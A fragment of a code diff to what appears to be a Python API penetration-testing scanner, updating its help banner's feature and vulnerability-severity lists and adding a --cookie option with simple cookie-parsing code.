+{Colors.YELLOW}✓{Colors.END} GraphQL Security Testing      - Schema introspection & queries
+{Colors.YELLOW}✓{Colors.END} JWT Attack Vectors            - Algorithm confusion & tampering
+{Colors.YELLOW}✓{Colors.END} OWASP API Top 10 2023         - Complete coverage
+{Colors.YELLOW}✓{Colors.END} Business Logic Testing        - Price/privilege manipulation
+{Colors.YELLOW}✓{Colors.END} Professional Reporting        - HTML, JSON, Console output
+
+{Colors.CYAN}{Colors.BOLD}═══════════════════════════════════════════════════════════════════════════
+VULNERABILITY DETECTION
+═══════════════════════════════════════════════════════════════════════════{Colors.END}
+
+{Colors.RED}CRITICAL:{Colors.END}  SQL Injection • Command Injection • SSRF • XXE
+           Authentication Bypass • Price Manipulation • Privilege Escalation
+
+{Colors.YELLOW}HIGH:{Colors.END}      XSS • Path Traversal • IDOR • GraphQL Exposure • JWT Flaws
+
+{Colors.CYAN}MEDIUM:{Colors.END}    Missing Security Headers • Rate Limiting • Info Disclosure
+
+{Colors.CYAN}{Colors.BOLD}═══════════════════════════════════════════════════════════════════════════{Colors.END}
+
+{Colors.WHITE}For complete documentation, see: README_V2.md
+For quick reference, see: QUICKSTART.txt
+For version comparison, see: VERSION_COMPARISON.txt{Colors.END}
+
+{Colors.BOLD}Ghost Ops Security - Professional Penetration Testing Tools{Colors.END}
         """
     )
     
@@ -1248,6 +1716,7 @@ Examples:
     parser.add_argument('-w', '--wordlist', help='Custom endpoint wordlist file')
     parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads (default: 10)')
     parser.add_argument('--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
+    parser.add_argument('--cookie', help='Cookie string (e.g., "session=abc123;user=admin")')
     
     args = parser.parse_args()
     
@@ -1258,6 +1727,14 @@ Examples:
             if ':' in header:
                 key, value = header.split(':', 1)
                 headers[key.strip()] = value.strip()
+    
+    # Parse cookies
+    cookies = {}
+    if args.cookie:
+        for cookie in args.cookie.split(';'):
+            if '=' in cookie:
+                key, value = cookie.split('=', 1)
+                cookies[key.strip()] = value.strip()
     
     # Parse proxy
     proxy = None
@@ -1282,7 +1759,8 @@ Examples:
         base_url=args.url,
         headers=headers,
         proxy=proxy,
-        threads=args.threads
+        threads=args.threads,
+        cookies=cookies
     )
     
     try:
